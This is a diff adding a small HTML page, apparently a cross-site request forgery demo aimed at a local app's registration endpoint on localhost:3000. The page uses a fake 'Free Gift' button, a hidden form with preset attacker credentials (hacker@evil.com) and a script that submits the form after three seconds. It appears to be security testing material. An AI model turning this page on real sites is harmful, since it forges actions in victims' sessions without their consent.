@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h2>Click this "Free Gift" button (malicious site)</h2>
+  <form id="csrfForm" action="http://localhost:3000/api/auth/register" method="POST">
+    <input type="hidden" name="username" value="hacked_account">
+    <input type="hidden" name="email" value="hacker@evil.com">
+    <input type="hidden" name="password" value="Hack1234">
+  </form>
+  <button onclick="document.getElementById('csrfForm').submit()">
+    🎁 Claim Free Gift!
+  </button>
+  
+  <script>
+    // Auto-submit after 3 seconds
+    setTimeout(() => {
+      document.getElementById('csrfForm').submit();
+    }, 3000);
+  </script>
+</body>
+</html>
